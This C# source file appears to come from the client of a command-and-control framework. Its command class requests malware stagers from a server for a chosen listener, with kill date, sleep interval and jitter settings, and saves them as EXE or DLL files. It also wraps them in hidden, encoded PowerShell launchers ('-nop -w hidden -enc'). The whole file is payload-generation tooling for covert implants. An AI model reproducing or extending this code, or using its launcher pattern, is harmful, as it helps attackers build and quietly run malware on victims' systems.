using Client.API;
using Client.Models;
using Client.ViewModels;
using Client.Views;

using Microsoft.Win32;

using Shared.Models;
using System;
using System.IO;
using System.Text;
using System.Windows.Input;

namespace Client.Commands
{
    class GeneratePayloadCommand : ICommand
    {
        private readonly PayloadGeneratorViewModel ViewModel;

        public event EventHandler CanExecuteChanged;

        public GeneratePayloadCommand(PayloadGeneratorViewModel viewModel)
        {
            ViewModel = viewModel;
        }

        public bool CanExecute(object parameter)
            => true;

        public void Execute(object parameter)
        {
            var request = new StagerRequest
            {
                Listener = ViewModel.SelectedListener.Name,
                KillDate = ViewModel.KillDate,
            };

            switch (ViewModel.SelectedPayloadFormat)
            {
                case PayloadFormat.PowerShell:
                    request.Type = StagerRequest.OutputType.EXE;
                    break;
                case PayloadFormat.EXE:
                    request.Type = StagerRequest.OutputType.EXE;
                    break;
                case PayloadFormat.DLL:
                    request.Type = StagerRequest.OutputType.DLL;
                    break;
                default:
                    request.Type = StagerRequest.OutputType.EXE;
                    break;
            }

            if (ViewModel.SelectedListener.Type == Listener.ListenerType.HTTP)
            {
                request.SleepInterval = ViewModel.SleepInterval;
                request.SleepJitter = ViewModel.SleepJitter;
            }

            GenerateStager(request);
        }

        private async void GenerateStager(StagerRequest request)
        {
            var progressBar = new ProgressBarView
            {
                Height = 60,
                Width = 300,

                DataContext = new ProgressBarViewModel
                {
                    Label = "Building..."
                }
            };

            progressBar.Show();

            var stager = await PayloadAPI.GenerateStager(request);

            progressBar.Close();

            if (stager.Length > 0)
            {
                SaveStager(stager);
            }
        }

        private void SaveStager(byte[] stager)
        {
            if (ViewModel.SelectedPayloadFormat == PayloadFormat.PowerShell)
            {
                var launcher = PowerShellLauncher.GenerateLauncher(stager);
                var encLauncher = Convert.ToBase64String(Encoding.Unicode.GetBytes(launcher));

                var powerShellPayloadView = new PowerShellPayloadView();

                var powerShellPayloadViewModel = new PowerShellPayloadViewModel(powerShellPayloadView)
                {
                    Launcher = $"powershell.exe -nop -w hidden -c \"{launcher}\"",
                    EncodedLauncher = $@"powershell.exe -nop -w hidden -enc {encLauncher}",
                };

                powerShellPayloadView.DataContext = powerShellPayloadViewModel;
                powerShellPayloadView.Show();
            }
            else
            {
                var save = new SaveFileDialog();

                switch (ViewModel.SelectedPayloadFormat)
                {
                    case PayloadFormat.EXE:
                        save.Filter = "EXE (*.exe)|*.exe";
                        break;
                    case PayloadFormat.DLL:
                        save.Filter = "DLL (*.dll)|*.dll";
                        break;
                }

                if ((bool)save.ShowDialog())
                {
                    File.WriteAllBytes(save.FileName, stager);
                }
            }

            ViewModel.View.Close();
        }
    }
}